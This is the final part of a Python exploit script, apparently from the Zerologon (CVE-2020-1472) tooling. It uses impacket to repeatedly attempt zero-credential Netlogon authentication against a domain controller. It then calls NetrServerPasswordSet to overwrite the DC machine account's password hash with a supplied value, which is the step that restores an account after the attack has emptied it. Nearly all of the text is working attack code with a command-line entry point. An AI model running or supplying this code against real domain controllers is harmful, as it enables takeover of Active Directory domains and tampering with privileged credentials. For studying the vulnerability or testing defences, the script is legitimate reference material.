      #request['Authenticator'] = authenticator
      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
      #request['ReturnAuthenticator']['Timestamp'] = 0 
      #request['QueryLevel'] = 1
      #resp = rpc_con.request(request)
      #resp.dump()

      nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
      nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)
      
      request = NetrServerPasswordSet()
      request['PrimaryName'] = NULL
      request['AccountName'] = target_computer + '$\x00'
      request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
      request['ComputerName'] = target_computer + '\x00'
      request["Authenticator"] = authenticator
      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
      #request['ReturnAuthenticator']['Timestamp'] = 0
      pwdata = impacket.crypto.SamEncryptNTLMHash(unhexlify(originalpw), sessionKey)
      request["UasNewPassword"] = pwdata
      resp = rpc_con.request(request)
      resp.dump()

      #request['PrimaryName'] = NULL
      #request['ComputerName'] = target_computer + '\x00'
      #request['OpaqueBuffer'] = b'HOLABETOCOMOANDAS\x00'
      #request['OpaqueBufferSize'] = len(b'HOLABETOCOMOANDAS\x00')
      #resp = rpc_con.request(request)
      #resp.dump()      
    except Exception as e:
      print(e)
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    #print(ex)
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer, originalpw):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer, originalpw)
    
    if rpc_con == None:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC machine account should be restored to it\'s original value. You might want to secretsdump again to check.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (4 <= len(sys.argv) <= 5):
    print('Usage: reinstall_original_pw.py <dc-name> <dc-ip> <hexlified original nthash>\n')
    print('Reinstalls a particular machine hash for the machine account on the target DC. Assumes the machine password has previously been reset to the empty string')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip, originalpw] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name, originalpw)
```
